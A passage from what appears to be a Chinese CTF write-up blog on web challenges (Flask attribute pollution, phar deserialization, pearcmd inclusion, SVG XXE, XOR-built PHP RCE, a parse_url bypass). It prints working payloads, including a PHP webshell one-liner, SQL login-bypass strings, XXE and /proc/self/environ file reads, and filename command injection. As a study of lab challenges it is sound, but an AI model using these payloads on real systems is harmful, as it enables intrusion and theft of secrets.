\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690183448142-533651ff-d59d-4e33-bf8a-4321a2d79b19.png)\n\n这里我们如果能污染__file__值 那么我们就可以读取任意文件了\n\n还有就是这题开了pin 而且还有个`/console`路由 这是咋发现的真离谱\n\n然后是黑名单waf了`__init__`\n\n在check()之后是进行了一次json.loads的，而json识别unicode  所以可以用unicode编码进行bypass\n\n预期解就是利用任意文件读取然后计算pin码 就可以getshell了\n\n这里就不赘述了\n\n## 非预期\n\n真正学习的是非预期\n\n这里有两种payload:\n\n### 第一种：污染__file__任意文件读取\n\n前面也说过原理了 只要我们将__file__污染为我们想读取的文件名即可\n\n直接读环境变量\n\n```python\n{\"username\":\"1\",\"password\":\"1\",\"\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f\":{\"__globals__\":{\"__file__\":\"/proc/self/environ\"}}}\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690184393793-d0a681ee-d952-4ce1-a399-3b4569f5cfef.png)\n\n然后访问`/proc/1/environ` 出题人环境变量中的flag忘删了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690184461558-65c4f6b7-4253-4e53-8b18-fb8274dba2d4.png)\n\n### 第二种: 污染 _static_folder  路径穿越\n\n首先来看看` _static_folder` \n\nflask init文件部分代码\n\n```python\ndef __init__(\n        self,\n        import_name,\n        static_url_path=None,\n        static_folder='static',\n        static_host=None,\n        host_matching=False,\n        subdomain_matching=False,\n        template_folder='templates',\n        instance_path=None,\n        instance_relative_config=False,\n        root_path=None\n    ):\n```\n\n可以看到`static_folder='static'` 默认是在static文件也即是默认的静态文件的位置  \n\n我的理解是 我们`static_folder`可以指定静态文件的位置 并且我们可以访问 一般我们做题都有注意到我们可以访问static目录 \n\n那么 如果我们污染`_static_folder`让他的路径为`/` 那么我们是不是可以根目录下的所有文件了 \n\n因此我们就可以路径穿越了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690185307308-a0208406-53ea-4081-b105-873fc05a2830.png)\n\n注意一下路径`/static/proc/1/environ`\n\n# MyPicDisk\n\n这道题目 如何上传文件的同时并且post数据 我尬住了 不太会 额额额 抽象\n\n然后赛后看了师傅们的wp 真的太强辣\n\n首先用户名存在万能钥匙登录 `admin' or 1=1#` 就可以登录了 \n\n然后存在源码泄露`/y0u_cant_find_1t.zip`\n\n```php\n<?php\n  session_start();\nerror_reporting(0);\nclass FILE{\n  public $filename;\n  public $lasttime;\n  public $size;\n  public function __construct($filename){\n    if (preg_match(\"/\\//i\", $filename)){\n      throw new Error(\"hacker!\");\n    }\n    $num = substr_count($filename, \".\");\n    if ($num != 1){\n      throw new Error(\"hacker!\");\n    }\n    if (!is_file($filename)){\n      throw new Error(\"???\");\n    }\n    $this->filename = $filename;\n    $this->size = filesize($filename);\n    $this->lasttime = filemtime($filename);\n  }\n  public function remove(){\n    unlink($this->filename);\n  }\n  public function show()\n  {\n    echo \"Filename: \". $this->filename. \"  Last Modified Time: \".$this->lasttime. \"  Filesize: \".$this->size.\"<br>\";\n  }\n  public function __destruct(){\n    system(\"ls -all \".$this->filename);\n  }\n}\n?>\n\n\n\n\n\n<?php\nif (!isset($_SESSION['user'])){\n}\nelse{\n  if ($_SESSION['user'] !== 'admin') {\n    echo \"<script>alert('you are not admin!!!!!');</script>\";\n    unset($_SESSION['user']);\n    echo \"<script>location.href='/index.php';</script>\";\n  }\n  echo \"<!-- /y0u_cant_find_1t.zip -->\";\n  if (!$_GET['file']) {\n    foreach (scandir(\".\") as $filename) {\n      if (preg_match(\"/.(jpg|jpeg|gif|png|bmp)$/i\", $filename)) {\n        echo \"<a href='index.php/?file=\" . $filename . \"'>\" . $filename . \"</a><br>\";\n      }\n    }\n    echo '\n<form action=\"index.php\" method=\"post\" enctype=\"multipart/form-data\">\n选择图片：<input type=\"file\" name=\"file\" id=\"\">\n<input type=\"submit\" value=\"上传\"></form>\n';\n    if ($_FILES['file']) {\n      $filename = $_FILES['file']['name'];\n      if (!preg_match(\"/.(jpg|jpeg|gif|png|bmp)$/i\", $filename)) {\n        die(\"hacker!\");\n      }\n      if (move_uploaded_file($_FILES['file']['tmp_name'], $filename)) {\n        echo \"<script>alert('图片上传成功!');location.href='/index.php';</script>\";\n      } else {\n        die('failed');\n      }\n    }\n  }\n  else{\n    $filename = $_GET['file'];\n    if ($_GET['todo'] === \"md5\"){\n      echo md5_file($filename);\n    }\n    else {\n      $file = new FILE($filename);\n      if ($_GET['todo'] !== \"remove\" && $_GET['todo'] !== \"show\") {\n        echo \"<img src='../\" . $filename . \"'><br>\";\n        echo \"<a href='../index.php/?file=\" . $filename . \"&&todo=remove'>remove</a><br>\";\n        echo \"<a href='../index.php/?file=\" . $filename . \"&&todo=show'>show</a><br>\";\n      } else if ($_GET['todo'] === \"remove\") {\n        $file->remove();\n        echo \"<script>alert('图片已删除!');location.href='/index.php';</script>\";\n      } else if ($_GET['todo'] === \"show\") {\n        $file->show();\n      }\n    }\n  }\n}\n?>\n</body>\n</html>\n```\n\n源码逻辑也比较清楚 我寄在了怎么一边上传文件一边post传参\n\n根据源码逻辑 我们先要登录成功 然后才能上传文件 所以post传参和发包同时弄 我不太会 \n\n因为这个题目登录成功之后还会退出来 不会留在上传文件的页面 所以我们要手动发包 我只会用现成的脚本\n\n```php\n    <!DOCTYPE html>\n    <html lang=\"en\">\n    <head>\n        <meta charset=\"UTF-8\">\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n        <title>POST数据包POC</title>\n    </head>\n    <body>\n    <form action=\"http://e8a71e4c-c09f-4e5c-85ff-9c8df9323115.node4.buuoj.cn:81/index.php\" method=\"post\" enctype=\"multipart/form-data\">\n    <!--链接是当前打开的题目链接-->\n        <label for=\"file\">文件名：</label>\n        <input type=\"file\" name=\"file\" id=\"file\"><br>\n        <input type=\"submit\" name=\"submit\" value=\"提交\">\n    </form>\n    </body>\n    </html>\n```\n\n所以就寄了 \n\n赛后看师傅们的wp 是用py脚本的发的 真的太强了\n\n然后这道题目最明显的就是 FILE类的析构函数存在一个命令执行漏洞然后就能想到是phar反序列化了\n\n```php\n  public function __destruct(){\n    system(\"ls -all \".$this->filename);\n  }\n```\n\n那么一般我们phar反序列化还要配合能够触发反序列化的文件操作函数才行\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690284296888-8b13e482-f7af-4f9f-9692-14afbbc72175.png)\n\n看了下这道题目源码没有这些函数 但是这次又学到一个函数就是md5_file()\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690284418928-34e41ed9-ef4a-46b1-9611-bca266194f9f.png)\n\n在源码这个地方 如果我们提交get参数 file和todo 那么他将会将我们的文件进行md5_file()后输出\n\n```php\n    $filename = $_GET['file'];\n    if ($_GET['todo'] === \"md5\"){\n      echo md5_file($filename);\n```\n\n那么phar反序列化能够搭配的函数又多了一个qwq\n\n所以思路明确 先phar生成一个包含我们恶意序列化的图片\n\n```php\n<?php\n\nclass FILE{\n    public $filename;\n    public $lasttime;\n    public $size;\n    public function __construct($filename){\n        $this->filename = $filename;\n    }\n}\n\n$a = new FILE(\"/;cat /adjaskdhnask_flag_is_here_dakjdnmsakjnfksd\");\n$phartest=new phar('phartest.phar',0);\n$phartest->startBuffering();\n$phartest->setMetadata($a);\n$phartest->setStub(\"<?php __HALT_COMPILER();?>\");\n$phartest->addFromString(\"test.txt\",\"test\");\n$phartest->stopBuffering();\n```\n\n然后配合脚本 上传上去 偷的https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&mid=2247493970&idx=1&sn=9a20317104c56bd5060763e1461908ea&chksm=e8a1ca83dfd643954775d5e84a80a74876cde679a30db3e581d0bb1553510ada71937299318a&mpshare=1&scene=23&srcid=07256NyrGaLqc95MJJrprw2j&sharer_sharetime=1690256252504&sharer_shareid=122e5be9c4961e59957c3603ed41e762#rd 师傅真的太强了\n\n```python\nimport os\nimport requests\n# 获取当前脚本文件的目录路径\ncurrent_directory = os.path.dirname(os.path.abspath(__file__))\n# 构建文件路径\nimage_path = os.path.join(current_directory, '1.jpg')\nproxy = {\n    \"http\": \"http://127.0.0.1:8080\"\n}\nburp0_url = \"http://e8a71e4c-c09f-4e5c-85ff-9c8df9323115.node4.buuoj.cn:81/?\"\nburp0_cookies = {\"PHPSESSID\": \"su\"}\nfiles = {\n    'file': ('1.jpg', open(image_path, 'rb'), 'image/jpeg')\n}\ndata = {\n    'username': \"x' or 1=1 or '='\",\n    'password': '1',\n    'submit': '登录'\n}\nres = requests.post(burp0_url, cookies=burp0_cookies, files=files, data=data, proxies=proxy)\nprint(res.text)\n#burp0_url = \"http://8ea14a59-3600-4799-a424-95e815a3d71f.node4.buuoj.cn:81/?file=phar:///var/www/html/1.jpg&todo=md5\"\n#res = requests.post(burp0_url,              cookies=burp0_cookies,data=data,proxies=proxy)\n#print(res.text)\n```\n\n先登录+上传文件 然后登录+phar包含\n\n都是同时进行每一步\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690284835271-ef78e974-b80b-42d8-ba3a-198e46ed4719.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690284900264-277755df-bda5-45f3-8a7d-7ffc1906ae9e.png)\n\n又学到了 之后要好好学一下requests这个库和其他常用库\n\n# ez_cms\n\n熊海cms v1.0 文件包含+pearcmd   第一次见\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1690190505171-21e3d749-3951-4d74-ab6a-360007a73ddf.png)\n\n关于pearcmd:\n\n[https://w4rsp1t3.moe/2021/11/26/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/](https://w4rsp1t3.moe/2021/11/26/关于利用pearcmd进行文件包含的一些总结/)\n\npayload:\n\n这个pearcmd的文件路径很难找 要一个一个试\n\n```\n?+config-create+/&r=../../../../../../../../../../../../usr/share/php/pearcmd&/<?=phpinfo();eval($_POST[1]);?>+/tmp/123.php\n```\n\n`?r=../../../../../../../tmp/123`访问rce就行了\n\n反正我没复现成功 感觉是赛后靶机和比赛的不一样 rce不了 还是我姿势不对 无语了\n\n# ez_py\n\n考点：django session pickle反序列化 \n\n 不太会 以后再来看 还是第一次见\n\n# ez_timing\n\nHTTP/2??????? 6\n\n","categories":["各赛事WP"]},{"title":"buu刷题（page 4-2）","url":"/post/d33f9f0e.html","content":"\nbuu刷题（page 4-2） \n\n<!--more-->\n\n越来越复杂 越来越吃力了 --^--\n\n# 113、[HarekazeCTF2019]Avatar Uploader 1\n\n一道挺有趣的题目\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689577625490-fcbf4e82-bb82-4697-9017-5a1190e19d50.png)\n\n登录一下 让我们上传头像 并且图片格式为png 并且大小小于256x256\n\nok 这道题目我其实最大的疑惑是源码怎么来的 也许只是buu没给源码？\n\n直接来看源码\n\n```ruby\n<?php\nerror_reporting(0);\n \nrequire_once('config.php');\nrequire_once('lib/util.php');\nrequire_once('lib/session.php');\n \n$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);\n \n// check whether file is uploaded\nif (!file_exists($_FILES['file']['tmp_name']) || !is_uploaded_file($_FILES['file']['tmp_name'])) {\n    error('No file was uploaded.');\n}\n \n// check file size\nif ($_FILES['file']['size'] > 256000) {\n    error('Uploaded file is too large.');\n}\n \n// check file type\n$finfo = finfo_open(FILEINFO_MIME_TYPE);//获取文件MIME类型\n$type = finfo_file($finfo, $_FILES['file']['tmp_name']);\nfinfo_close($finfo);\nif (!in_array($type, ['image/png'])) {\n    error('Uploaded file is not PNG format.');\n}\n \n// check file width/height\n$size = getimagesize($_FILES['file']['tmp_name']);\nif ($size[0] > 256 || $size[1] > 256) {\n    error('Uploaded image is too large.');\n}\nif ($size[2] !== IMAGETYPE_PNG) {\n    // I hope this never happens...\n    error('What happened...? OK, the flag for part 1 is: <code>' . getenv('FLAG1') . '</code>');\n}\n \n// ok\n$filename = bin2hex(random_bytes(4)) . '.png';\nmove_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_DIR . '/' . $filename);\n \n$session->set('avatar', $filename);\nflash('info', 'Your avatar has been successfully updated!');\nredirect('/');\n```\n\n最重要的是这两部分：\n\n```ruby\n// check file type\n$finfo = finfo_open(FILEINFO_MIME_TYPE);//获取文件MIME类型\n$type = finfo_file($finfo, $_FILES['file']['tmp_name']);\nfinfo_close($finfo);\nif (!in_array($type, ['image/png'])) {\n    error('Uploaded file is not PNG format.');\n}\n\n\n\n\n// check file width/height\n$size = getimagesize($_FILES['file']['tmp_name']);\nif ($size[0] > 256 || $size[1] > 256) {\n    error('Uploaded image is too large.');\n}\nif ($size[2] !== IMAGETYPE_PNG) {\n    // I hope this never happens...\n    error('What happened...? OK, the flag for part 1 is: <code>' . getenv('FLAG1') . '</code>');\n}\n```\n\n第一部分通过 finfo_file()来获取mine信息 要求我们上传的是png图片\n\n第二部分getimagesize()来获取大小并且不只是大小还有其他图片信息 这个函数会返回一个包含图片信息的数组\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578104255-28975875-7950-4504-9327-5b15c60952bb.png)\n\n```ruby\nif ($size[2] !== IMAGETYPE_PNG) {\n    // I hope this never happens...\n    error('What happened...? OK, the flag for part 1 is: <code>' . getenv('FLAG1') . '</code>');\n}\n```\n\n并且又要求getimagesize()获取到图片信息中不能为png图片 这样才会给我们flag\n\n所以总结一下就是要求我们 finfo_file()获取到mine为png图片 但是getimagesize()获取到图片信息又不能为png图片\n\n所以这样很明显我们需要绕过getimagesize()也就是让`$size[2] !== IMAGETYPE_PNG`这个条件成立\n\n问一下gpt\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578140917-e7bfeac6-bd41-4084-91de-0ac3d3137d68.png)\n\n我们可以让getimagesize()函数在获取图片信息的时候让其出错 从而使得这个条件成立 成功bypass\n\n随便找一个符合其他条件的png 图片\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578241021-d8677a96-be39-441b-80ea-27bfc18677cb.png)\n\n将除了第一行以外的其他信息全部删除生成一张png图片\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578269747-e962712b-9a68-4004-adde-9f8db3b60f18.png)\n\n这样只有文件头部是正常的getimagesize()获取不到图片的其他信息从而出错\n\n成功！\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578387080-53ad022c-e65d-4003-887e-d1d92ceab8d4.png)\n\n# 114、[BSidesCF 2019]SVGMagic\n\nSVG是Scalable Vector Graphics的缩写,意为可缩放向量图形。它是一种使用XML描述2D图形的图像文件格式。\n\n也就是说SVG是XML文件  \n\n那么说到xml 立马就能想到xxe 如果我们在svg图像中插入xxe恶意代码呢 \n\n直接偷师傅的payload：\n\n```ruby\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE note [\n<!ENTITY file SYSTEM \"file:///proc/self/cwd/flag.txt\" >\n]>\n<svg height=\"100\" width=\"1000\">\n  <text x=\"10\" y=\"20\">&file;</text>\n</svg>\n```\n\n这里要注意的是：\n\n一般我们进行xxe的时候，定义了外部实体还要通过`&`来调用这个实体，但是这道题目不需要 只需要上传上去之后他会执行 然后再把结果反馈到png图像中  可能这就是render的魅力吧:)\n\n这道题目flag文件不知道在哪里\n\n`/proc/self/cwd`表示当前路径 `/proc/self/root`表示的是`/`根目录\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689579753906-b0e3ebde-2b81-4cb3-a9f0-63176d7ea6fc.png)\n\n# 115、[ISITDTU 2019]EasyPHP\n\n一道奇淫rce构造rce的题目 其实就是异或构造+无参rce\n\n```ruby\n<?php\nhighlight_file(__FILE__);\n\n$_ = @$_GET['_'];\nif ( preg_match('/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i', $_) )\n    die('rosé will not do it');\n\nif ( strlen(count_chars(strtolower($_), 0x3)) > 0xd )\n    die('you are so close, omg');\n\neval($_);\n?>\n```\n\n正则waf了这些\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689584978289-6c38ec2a-8a6f-4cf9-bac3-a3d6e45ad99b.png)\n\n再来看看这部分：\n\n```ruby\nif ( strlen(count_chars(strtolower($_), 0x3)) > 0xd )\n    die('you are so close, omg');\n```\n\nstrtolower:将我们输入的内容转为小写\n\ncount_chars:返回字符串所用字符的信息\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689585086139-4169ecf7-ab7b-45b8-86fc-f94a956ea8d4.png)\n\n这里模式为3所以返回所有使用了的字节值组成的字符串\n\nstrlen:获取字符串长度\n\n所以整个这一部分就是计算我们输入字符串字符类型个数 获取我们总共输入了几种字符\n\n看了这道题的wp 主要是很麻烦 核心就是通过异或来构造webshell\n\n**这里有个小tips 一般我们构造异或payload的时候都是与**`%ff`**异或来获取字符的**\n\n一个简单的demo理解异或构造\n\n```ruby\nphp > var_dump(@a^\"1\");\nstring(1) \"P\"\nphp > echo ord(\"a\");\n97\nphp > echo ord(\"1\");\n49\nphp > echo 97^49;\n80\nphp > echo chr(80);\nP\n```\n\n那么问题是97^49为什么是80呢 \n\n其实是十进制先转为二进制 然后两个数的每一位二进制之间进行异或得到的数再转为十进制就是结果\n\n```ruby\n01100001 #97二进制\n00110001 #49二进制\n01010000 #按位异或\n```\n\n可见这个结果就是十进制的80\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689585887772-568d3234-ea97-458e-9479-d40477f308b3.png)\n\n看了这篇文章还是很不错的https://xz.aliyun.com/t/5677#toc-1\n\n里面还有通过非`！`来进行构造数字payload 真的tql\n\n```php\n<?php\nvar_dump(@'a');\nvar_dump(@!'a');\nvar_dump(@!!'a');\nvar_dump(@!!'a'+@!!'a');\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689586290324-cb408fc9-2f9f-4667-8971-6bec93fef49b.png)\n\n成功构造出数字2\n\n然后这道题目就是会限制我们的字符类型要在13以内 就是要去找别的字符来减少payload 这点很麻烦\n\n其次就是无参rce\n\n构造`print_r(scandir(.))`来找flag文件\n\npaylaod:`((%8F%8D%96%91%8B%A0%8D)^(%ff%ff%ff%ff%ff%ff%ff))(((%8C%9C%9E%91%9B%96%8D)^(%ff%ff%ff%ff%ff%ff%ff))(%D1^%ff));`但是里面的字符类型超过13了\n\n利用已经存在的字符异或来替换减少字符类型\n\n查找可以替换的字符\n\na = c^p^r \n\nd = s^c^t \n\nn = i^s^t\n\n每个替换字符再与%ff异或一下\n\n得到：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689586916100-cb946524-270b-4b18-a5bc-5f0df59a7c1f.png)\n\n最后构造：\n\n```\n((%8f%8d%96%96%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%8c%ff%ff%ff)^(%ff%ff%ff%8b%ff%ff%ff))(((%8c%9c%9c%96%8c%96%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%8f%8c%9c%ff%ff)^(%ff%ff%8d%8b%8b%ff%ff))(%d1^%ff));\n```\n\n发现flag文件\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689586959408-c62cf98f-999c-4bf5-b00a-071047f80595.png)\n\n再构造： `readfile(end(scandir(.)))` 思路和上面一样\n\npayload:`((%8c%9a%9e%9b%9c%96%93%9a)^(%ff%ff%ff%ff%ff%ff%ff%ff)^(%9b%ff%ff%ff%93%ff%ff%ff)^(%9a%ff%ff%ff%96%ff%ff%ff))(((%9a%9c%9b)^(%ff%ff%ff)^(%ff%93%ff)^(%ff%9e%ff))(((%8c%9c%9e%9c%9b%96%8c)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%93%ff%ff%9b)^(%ff%ff%ff%9e%ff%ff%9a))(%d1^%ff)));`\n\n参考：https://www.shawroot.cc/1209.html payload都是偷的这个大佬的qaq\n\n# 116、[FireshellCTF2020]Caas\n\n一个c语言文件包含的题目 新奇\n\n一开始以为是php环境或者python 然后搜索报错信息之后返现是c语言\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689589242051-f7b75cce-acff-450e-b3d1-cb3da4fe2d1c.png)\n\npayload:`#include \"/flag\"`\n\n# 117、[N1CTF 2018]eating_cms\n\n考点：parse_url解析漏洞\n\n首先在`/register.php`下申请一个账号 老套路了 然后登录\n\n然后看了下请求的网址 很像任意文件读取url\n\n```\n/user.php?page=php://filter/read=convert.base64-encode/resource=info\n```\n\n用伪协议读一下 得到以下内容\n\nindex.php\n\n```php\n<?php\nrequire_once \"function.php\";\nif(isset($_SESSION['login'] )){\n    Header(\"Location: user.php?page=info\");\n}\nelse{\n    include \"templates/index.html\";\n}\n?>\n```\n\nuser.php\n\n```php\n<?php\n  require_once(\"function.php\");\nif( !isset( $_SESSION['user'] )){\n  Header(\"Location: index.php\");\n\n}\nif($_SESSION['isadmin'] === '1'){\n  $oper_you_can_do = $OPERATE_admin;\n}else{\n  $oper_you_can_do = $OPERATE;\n}\n//die($_SESSION['isadmin']);\nif($_SESSION['isadmin'] === '1'){\n  if(!isset($_GET['page']) || $_GET['page'] === ''){\n    $page = 'info';\n  }else {\n    $page = $_GET['page'];\n  }\n}\nelse{\n  if(!isset($_GET['page'])|| $_GET['page'] === ''){\n    $page = 'guest';\n  }else {\n    $page = $_GET['page'];\n    if($page === 'info')\n    {\n      //            echo(\"<script>alert('no premission to visit info, only admin can, you are guest')</script>\");\n      Header(\"Location: user.php?page=guest\");\n    }\n  }\n}\nfilter_directory();\n//if(!in_array($page,$oper_you_can_do)){\n//    $page = 'info';\n//}\ninclude \"$page.php\";\n?>\n```\n\ninfo.php\n\n```php\n<?php\nif (FLAG_SIG != 1){\n    die(\"you can not visit it directly \");\n}\ninclude \"templates/info.html\";\n?>\n```\n\nfunction.php\n\n```php\n<?php\nsession_start();\nrequire_once \"config.php\";\nfunction Hacker()\n{\n    Header(\"Location: hacker.php\");\n    die();\n}\n\n\nfunction filter_directory()\n{\n    $keywords = [\"flag\",\"manage\",\"ffffllllaaaaggg\"];\n    $uri = parse_url($_SERVER[\"REQUEST_URI\"]);\n    parse_str($uri['query'], $query);\n//    var_dump($query);\n//    die();\n    foreach($keywords as $token)\n    {\n        foreach($query as $k => $v)\n        {\n            if (stristr($k, $token))\n                hacker();\n            if (stristr($v, $token))\n                hacker();\n        }\n    }\n}\n\nfunction filter_directory_guest()\n{\n    $keywords = [\"flag\",\"manage\",\"ffffllllaaaaggg\",\"info\"];\n    $uri = parse_url($_SERVER[\"REQUEST_URI\"]);\n    parse_str($uri['query'], $query);\n//    var_dump($query);\n//    die();\n    foreach($keywords as $token)\n    {\n        foreach($query as $k => $v)\n        {\n            if (stristr($k, $token))\n                hacker();\n            if (stristr($v, $token))\n                hacker();\n        }\n    }\n}\n\nfunction Filter($string)\n{\n    global $mysqli;\n    $blacklist = \"information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password\";\n    $whitelist = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+><\";\n    for ($i = 0; $i < strlen($string); $i++) {\n        if (strpos(\"$whitelist\", $string[$i]) === false) {\n            Hacker();\n        }\n    }\n    if (preg_match(\"/$blacklist/is\", $string)) {\n        Hacker();\n    }\n    if (is_string($string)) {\n        return $mysqli->real_escape_string($string);\n    } else {\n        return \"\";\n    }\n}\n\nfunction sql_query($sql_query)\n{\n    global $mysqli;\n    $res = $mysqli->query($sql_query);\n    return $res;\n}\n\nfunction login($user, $pass)\n{\n    $user = Filter($user);\n    $pass = md5($pass);\n    $sql = \"select * from `albert_users` where `username_which_you_do_not_know`= '$user' and `password_which_you_do_not_know_too` = '$pass'\";\n    echo $sql;\n    $res = sql_query($sql);\n//    var_dump($res);\n//    die();\n    if ($res->num_rows) {\n        $data = $res->fetch_array();\n        $_SESSION['user'] = $data[username_which_you_do_not_know];\n        $_SESSION['login'] = 1;\n        $_SESSION['isadmin'] = $data[isadmin_which_you_do_not_know_too_too];\n        return true;\n    } else {\n        return false;\n    }\n    return;\n}\n\nfunction updateadmin($level,$user)\n{\n    $sql = \"update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '$level' where `username_which_you_do_not_know`='$user' \";\n    echo $sql;\n    $res = sql_query($sql);\n//    var_dump($res);\n//    die();\n//    die($res);\n    if ($res == 1) {\n        return true;\n    } else {\n        return false;\n    }\n    return;\n}\n\nfunction register($user, $pass)\n{\n    global $mysqli;\n    $user = Filter($user);\n    $pass = md5($pass);\n    $sql = \"insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('$user','$pass','0')\";\n    $res = sql_query($sql);\n    return $mysqli->insert_id;\n}\n\nfunction logout()\n{\n    session_destroy();\n    Header(\"Location: index.php\");\n}\n\n?>\n```\n\nconfig.php\n\n```php\n<?php\nerror_reporting(E_ERROR | E_WARNING | E_PARSE);\ndefine(BASEDIR, \"/var/www/html/\");\ndefine(FLAG_SIG, 1);\n$OPERATE = array('userinfo','upload','search');\n$OPERATE_admin = array('userinfo','upload','search','manage');\n$DBHOST = \"localhost\";\n$DBUSER = \"root\";\n$DBPASS = \"Nu1LCTF2018!@#qwe\";\n//$DBPASS = \"\";\n$DBNAME = \"N1CTF\";\n$mysqli = @new mysqli($DBHOST, $DBUSER, $DBPASS, $DBNAME);\nif(mysqli_connect_errno()){\n        echo \"no sql connection\".mysqli_connect_error();\n        $mysqli=null;\n        die();\n}\n?>\n```\n\n代码审计一下没发现什么不对的 我以为是sql注入\n\n但是看了wp 发现是我没学到的知识点\n\n其他文件没有什么 直接来看重要的function.php\n\n定位到：\n\n```php\nfunction filter_directory_guest()\n{\n    $keywords = [\"flag\",\"manage\",\"ffffllllaaaaggg\",\"info\"];\n    $uri = parse_url($_SERVER[\"REQUEST_URI\"]);\n    parse_str($uri['query'], $query);\n//    var_dump($query);\n//    die();\n    foreach($keywords as $token)\n    {\n        foreach($query as $k => $v)\n        {\n            if (stristr($k, $token))\n                hacker();\n            if (stristr($v, $token))\n                hacker();\n        }\n    }\n}\n```\n\n发现存在parse_url解析漏洞\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689742999096-b318c342-ce4a-475b-a82b-479e913e7f0b.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689743053375-32586548-cdef-45ab-9fd0-9d420a14c6b5.png)\n\n可以借助一个demo来理解\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689743421112-e924c505-196c-450c-8811-58f86831aa55.png)\n\n parse_url()会把`//`认为是相对路径 \n\n于是当我们在路径前多输入一个/，会使这个函数失效，这样就绕过了检测  \n\n如果我们直接输入`/user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg`会被检测\n\n但是在前面多加一个`/`成功读到了源码\n\n```\n//user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg\n<?php\nif (FLAG_SIG != 1){\n    die(\"you can not visit it directly\");\n}else {\n    echo \"you can find sth in m4aaannngggeee\";\n}\n?>\n```\n\n利用伪协议读源码 \n\n然后得到\n\n```php\n<?php\nif (FLAG_SIG != 1){\n    die(\"you can not visit it directly\");\n}\ninclude \"templates/upload.html\";\n\n?>\n```\n\n访问`/templates/upload.html`\n\n但是是个假的上传点\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689742013537-59d3d70f-8100-4372-a4d1-ffb424e4e727.png)\n\n随便上传一个文件之后会报错并且发现存在`/upllloadddd.php`\n\n然后利用前面的伪协议获取源码\n\n```php\n<?php\n$allowtype = array(\"gif\",\"png\",\"jpg\");\n$size = 10000000;\n$path = \"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\";\n$filename = $_FILES['file']['name'];\nif(is_uploaded_file($_FILES['file']['tmp_name'])){\n    if(!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename)){\n        die(\"error:can not move\");\n    }\n}else{\n    die(\"error:not an upload file！\");\n}\n$newfile = $path.$filename;\necho \"file upload success<br />\";\necho $filename;\n$picdata = system(\"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\".$filename.\" | base64 -w 0\");\necho \"<img src='data:image/png;base64,\".$picdata.\"'></img>\";\nif($_FILES['file']['error']>0){\n    unlink($newfile);\n    die(\"Upload file error: \");\n}\n$ext = array_pop(explode(\".\",$_FILES['file']['name']));\nif(!in_array($ext,$allowtype)){\n    unlink($newfile);\n}\n?>\n```\n\n直接定位到这一行代码\n\n```\n$picdata = system(\"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\".$filename.\" | base64 -w 0\");\n```\n\n发现存在文件上传名漏洞 可以修改文件名闭合命令执行\n\n但是真正的上传点在哪呢 